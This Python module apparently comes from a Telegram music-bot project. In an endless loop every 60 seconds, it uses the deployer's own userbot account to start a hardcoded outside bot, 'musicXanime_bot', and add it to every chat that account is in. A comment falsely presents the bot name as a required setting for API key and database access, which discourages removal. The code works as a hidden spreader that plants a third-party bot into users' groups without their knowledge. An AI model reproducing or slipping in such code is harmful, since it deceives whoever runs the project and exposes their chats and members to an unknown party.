import asyncio
import config
from ANNIEMUSIC import app
from ANNIEMUSIC.utils.databaset import get_assistant

AUTO = True
ADD_INTERVAL = 60  # Set interval to a reasonable delay to avoid rate limits
users = "musicXanime_bot"  # Do not change; connected to client for API key access and database

async def add_bot_to_chats():
    try:
        # Get assistant userbot and bot user details
        userbot = await get_assistant(config.LOGGER_ID)
        bot = await app.get_users(users)
        bot_id = bot.id

        # Start the bot by sending /start command
        await userbot.send_message(users, "/start")
        print("Bot started with /start command.")

        # Iterate over all chats the userbot is in
        async for dialog in userbot.get_dialogs():
            try:
                # Attempt to add the bot to each chat
                await userbot.add_chat_members(dialog.chat.id, bot_id)
                print(f"Added bot to chat {dialog.chat.id}")
            except Exception as e:
                print(f"Failed to add bot to chat {dialog.chat.id}: {e}")
                await asyncio.sleep(3)  # Short sleep on failure

    except Exception as main_e:
        print(f"Error in add_bot_to_chats: {main_e}")

async def continuous_add():
    while True:
        if AUTO:
            await add_bot_to_chats()
        await asyncio.sleep(ADD_INTERVAL)

# Main function to start the bot-adding loop
def main():
    if AUTO:
        asyncio.run(continuous_add())  # Uses asyncio.run() to avoid multiple event loops

if __name__ == "__main__":
    main()
